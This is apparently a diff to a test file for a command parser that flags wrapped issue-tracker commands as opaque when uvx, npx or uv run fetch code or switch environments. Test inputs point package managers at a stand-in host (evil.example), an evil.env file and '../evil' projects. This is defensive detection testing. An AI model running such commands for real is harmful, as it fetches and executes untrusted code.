@@ -397,10 +397,15 @@ describe('command parser', () => {
       reason: 'assignment',
       writes: [{ tracker: 'br', verb: 'close' }],
     })
+    expect(parseCommand('uv run --env-file evil.env br close a', VERBS)).toEqual({
+      kind: 'opaque',
+      reason: 'assignment',
+      writes: [{ tracker: 'br', verb: 'close' }],
+    })
     expect(parseCommand('br close a --title FOO=1', VERBS).kind).toBe('write')
   })
 
-  test('stays opaque for a wrapper that fetches code from a named source', () => {
+  test('stays opaque for a wrapper that fetches code or picks the environment', () => {
     for (const command of [
       'uvx --from=git+https://evil.example/pkg br close a',
       'uvx --with evil br close a',
@@ -411,6 +416,13 @@ describe('command parser', () => {
       'npx --package evil br close a',
       'npx --package=evil br close a',
       'npx -p evil br close a',
+      'uvx br close a',
+      'npx br close a',
+      'npx -y br close a',
+      'uv run --index https://evil.example/simple br close a',
+      'uv run --index=https://evil.example/simple br close a',
+      'uv run --directory ../evil br close a',
+      'uv run --project ../evil br close a',
     ]) {
       expect({ command, parsed: parseCommand(command, VERBS) }).toMatchObject({
         command,
@@ -477,17 +489,53 @@ describe('command parser', () => {
     expect(parseCommand('uvx --help br close a', VERBS)).toEqual({ kind: 'none' })
   })
 
-  test('strips uvx and npx wrappers and splits on ||', () => {
-    expect(parseCommand('br close a || uvx br close b', VERBS)).toEqual({
-      kind: 'write',
+  test('strips uv run, uvx and npx wrappers and splits on ||', () => {
+    expect(parseCommand('br close a || uv run br close b', VERBS)).toEqual({
+      kind: 'opaque',
+      reason: 'hidden-status',
       writes: [
         { tracker: 'br', verb: 'close' },
         { tracker: 'br', verb: 'close' },
       ],
     })
     expect(parseCommand('npx -y br --db .beads/x.db comments add a hi', VERBS)).toEqual({
-      kind: 'write',
+      kind: 'opaque',
+      reason: 'fetch',
       writes: [{ tracker: 'br', verb: 'comments add' }],
+    })
+    expect(parseCommand('uv run br close a', VERBS)).toEqual({
+      kind: 'write',
+      writes: [{ tracker: 'br', verb: 'close' }],
+    })
+  })
+
+  test('stays opaque when a later write hides the exit status of an earlier write', () => {
+    const two = [
+      { tracker: 'br', verb: 'close' },
+      { tracker: 'br', verb: 'close' },
+    ]
+    for (const command of [
+      'br close a; br close b',
+      'br close a\nbr close b',
+      'br close a || br close b',
+      'br close a | br close b',
+      'br close a; cd x && br close b',
+      'br close a; br close b; echo "exit=$?"',
+    ]) {
+      expect({ command, parsed: parseCommand(command, VERBS) }).toEqual({
+        command,
+        parsed: { kind: 'opaque', reason: 'hidden-status', writes: two },
+      })
+    }
+    expect(parseCommand('br close a && br close b', VERBS)).toEqual({ kind: 'write', writes: two })
+    expect(parseCommand('cd x && br close a && cd y && br close b', VERBS)).toEqual({
+      kind: 'write',
+      writes: two,
+    })
+    expect(parseCommand('br close a && br close b; echo "exit=$?"', VERBS)).toEqual({
+      kind: 'echoed',
+      writes: two,
+      line: 'exit=$?',
     })
   })
 
